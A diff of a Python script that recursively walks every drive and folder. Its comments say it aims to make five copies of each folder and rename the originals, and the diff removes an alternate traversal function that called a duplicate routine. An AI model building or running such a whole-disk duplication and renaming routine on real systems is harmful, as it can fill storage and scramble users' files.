@@ -1,5 +1,6 @@
 import os
-
+import shutil
+import random
 #get the current path
 #get the current folder names
 #create 5 folder copys
@@ -7,7 +8,6 @@ import os
 #change the original folder's name
     #0th one into 3rd folder
 drives = []
-#folders = []
 
 
 
@@ -17,10 +17,10 @@ def main():
     for drive in drives:
         Path = ""
         Path += drive
-        #Path = "C:/mber"
-        drive_is_done = False
         folder_is_done = False
         folder_explore(folder_is_done,Path)
+
+
 
 def drive_getter():
     #drive checker
@@ -67,24 +67,6 @@ def folder_explore(folder_is_done,Path):
                     Path = old_path
                     Path += f"/{folder}"
                     folder_explore(folder_is_done,Path)
-            else:
-                 folder_is_done = True
-    return
-
-def folder_explore2(folder_is_done,Path):
-    while folder_is_done == False:
-            if os.path.isdir(Path):
-                folders = folder_getter(Path)
-                old_path = Path
-                if len(folders) != 0:
-                    os.chdir(Path)
-                    for folder in folders:
-                                duplicate(folder)
-                                Path += f"/{folder}"
-                                print(Path)
-                                #folder_explore(folder_is_done,Path)
-                else:
-                    folder_is_done = True
             else:
                  folder_is_done = True
 
